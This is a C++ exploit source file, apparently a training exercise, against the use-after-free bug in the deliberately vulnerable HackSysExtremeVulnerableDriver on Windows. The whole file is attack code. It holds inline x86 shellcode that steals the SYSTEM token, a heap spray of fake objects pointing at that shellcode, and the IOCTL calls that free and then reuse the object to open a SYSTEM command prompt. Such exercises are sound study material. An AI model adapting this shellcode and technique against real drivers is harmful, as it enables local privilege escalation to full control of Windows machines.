// HEVD_UAF.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>

struct FAKE_OBJECT
{
	DWORD pointer;
	char buf[0x54];
};

// 抄的shellcode
void shellcode()
{
	_asm
	{
		nop
		pushad
		mov eax, fs:[124h]		// 找到当前线程的_KTHREAD结构
		mov eax, [eax + 0x50]   // 找到_EPROCESS结构
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

	// 循环是为了获取system的_EPROCESS
	find_sys_pid :
				 mov eax, [eax + 0xb8]	// 找到进程活动链表
				 sub eax, 0xb8    		// 链表遍历
				 cmp[eax + 0xb4], edx    // 根据PID判断是否为SYSTEM
				 jnz find_sys_pid

				 // 替换Token
				 mov edx, [eax + 0xf8]
				 mov[ecx + 0xf8], edx
				 popad
				 ret
	}
}


int main()
{
	HANDLE hDevice = NULL;
	DWORD recv = NULL;

	hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (FAILED(hDevice))
	{
		printf("Failed to open device\n");
		return 0;
	}

	// AllocateUaFObject
	DeviceIoControl(hDevice, 0x222013, NULL, NULL, NULL, NULL, &recv, NULL);

	// FreeUaFObject
	DeviceIoControl(hDevice, 0x22201B, NULL, NULL, NULL, NULL, &recv, NULL);

	//将 shellcode 的指针写到 0x58 大小的缓冲区中，用于堆喷
	FAKE_OBJECT * buffer = (FAKE_OBJECT *)malloc(0x58);
	buffer->pointer = (DWORD)shellcode;
	memset(buffer->buf, 0x41, 0x54);

	//调用 AllocateFakeObject 实现堆喷
	for (int i = 0; i < 5000; i++)
	{
		// AllocateFakeObject
		DeviceIoControl(hDevice, 0x22201F, buffer, 0x58, NULL, NULL, &recv, NULL);
	}

	// UseUaFObject
	DeviceIoControl(hDevice, 0x222017, NULL, NULL, NULL, NULL, &recv, NULL);

	system("start cmd.exe");

	CloseHandle(hDevice);
	std::cout << "Done!\n";
	return 0;
}